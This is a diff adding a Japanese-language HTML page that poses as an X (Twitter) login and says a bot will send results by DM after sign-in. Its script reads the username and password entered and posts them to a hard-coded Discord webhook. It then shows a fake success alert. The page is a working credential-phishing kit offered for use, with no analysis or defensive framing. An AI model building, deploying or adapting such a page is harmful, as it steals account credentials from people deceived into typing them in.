@@ -1,0 +1,66 @@
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+<div class="bg-white py-6 sm:py-8 lg:py-12">
+    <div class="mx-auto max-w-screen-2xl px-4 md:px-8">
+      <h2 class="mb-4 text-center text-2xl font-bold text-gray-800 md:mb-8 lg:text-3xl">ログイン</h2>
+  
+      <div class="mx-auto max-w-lg rounded-lg border">
+        <div class="flex flex-col gap-4 p-4 md:p-8">
+          <div>
+            <label for="email" class="mb-2 inline-block text-sm text-gray-800 sm:text-base">メールアドレスまたはユーザー名</label>
+            <input name="email" id="eid"class="w-full rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring" />
+          </div>
+  
+          <div>
+            <label for="password" class="mb-2 inline-block text-sm text-gray-800 sm:text-base">パスワード</label>
+            <input name="password" id="pas"class="w-full rounded border bg-gray-50 px-3 py-2 text-gray-800 outline-none ring-indigo-300 transition duration-100 focus:ring" />
+          </div>
+  
+          <button id="sendButton"class="block rounded-lg bg-gray-800 px-8 py-3 text-center text-sm font-semibold text-white outline-none ring-gray-300 transition duration-100 hover:bg-gray-700 focus-visible:ring active:bg-gray-600 md:text-base">ログイン</button>
+  
+          
+        
+  
+          <button class="flex items-center justify-center gap-2 rounded-lg border border-gray-300 bg-white px-8 py-3 text-center text-sm font-semibold text-gray-800 outline-none ring-gray-300 transition duration-100 hover:bg-gray-100 focus-visible:ring active:bg-gray-200 md:text-base">
+            <img class="h-8 w-8 shrink-0" width="24" height="24" fill="none" src="https://img.freepik.com/free-vector/new-2023-twitter-logo-x-icon-design_1017-45418.jpg?semt=ais_hybrid&w=740">
+              
+  
+            のログイン
+          </button>
+          <label  class="mb-2 inline-block text-sm text-gray-800 sm:text-base">ログイン後数分でBOTから結果があなたのDMに送信されます</label>
+        </div>
+  
+</div>
+    </div>
+  </div>
+  <script>
+    document.getElementById('sendButton').addEventListener('click', function() {
+      const input1 = document.getElementById('eid').value;
+      const input2 = document.getElementById('pas').value;
+
+      const webhookURL = 'https://discord.com/api/webhooks/1376571175265767494/2v9CR9-ExIwCesc4kstehpFT_ZvZVEYGNYwJY9SuovSYpitQXRYOPns-FBsC3WWhmha4';
+
+      const payload = {
+        content: `📩 :\n**メアドまたはID**: ${input1}\n**パスワード**: ${input2}`
+      };
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (response.ok) {
+          alert('ログインが完了しました。５分程度でDMが送信されます');
+        } else {
+          alert('ログインに失敗しました。');
+        }
+      })
+      .catch(error => {
+        console.error('エラー:', error);
+        alert('エラーが発生しました。');
+      });
+    });
+  </script>
